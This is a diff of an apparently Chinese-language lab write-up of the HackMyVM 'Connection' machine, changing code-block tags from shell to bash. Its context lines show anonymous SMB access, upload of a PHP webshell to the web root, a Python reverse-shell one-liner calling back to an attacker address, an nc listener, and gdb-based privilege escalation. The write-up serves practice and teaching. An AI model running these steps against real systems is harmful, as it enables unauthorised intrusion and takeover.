@@ -85,7 +85,7 @@ Host script results:
 
 列出服务器上 smb 服务的信息
 
-```shell
+```bash
 ┌─[✗]─[randark@randark-Parrot]─[~]
 └──╼ $smbclient --no-pass -L //192.168.56.106
 Anonymous login successful
@@ -100,7 +100,7 @@ SMB1 disabled -- no workgroup available
 
 发现一个 `share` 目录，进入终端查看内容
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $smbclient -N \\\\192.168.56.106/share
 Anonymous login successful
@@ -122,7 +122,7 @@ smb: \html\> ls
 
 可以推断这个目录为 web 服务的工作目录，尝试写 php 马
 
-```shell
+```bash
 smb: \html\> put webshell.php
 putting file webshell.php as \html\webshell.php (7.8 kb/s) (average 7.8 kb/s)
 smb: \html\> ls
@@ -136,7 +136,7 @@ smb: \html\> ls
 
 访问 web 服务，发现可以被正常解析
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Connection]
 └──╼ $http get 192.168.56.106/webshell.php
 HTTP/1.1 200 OK
@@ -168,7 +168,7 @@ Server: Apache/2.4.38 (Debian)
 
 成功收到回连 shell
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Connection]
 └──╼ $nc -lvnp 9999
 listening on [any] 9999 ...
@@ -179,7 +179,7 @@ www-data
 
 并利用 pwncat-cs 进一步稳定 shell
 
-```shell
+```bash
 python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",9999));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
 ```
 
@@ -220,7 +220,7 @@ bash: sudo: command not found
 
 ## 利用 gdb 进行提权
 
-```shell
+```bash
 (remote) www-data@connection:/var/www/html$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
 GNU gdb (Debian 8.2.1-2+b3) 8.2.1
 Copyright (C) 2018 Free Software Foundation, Inc.
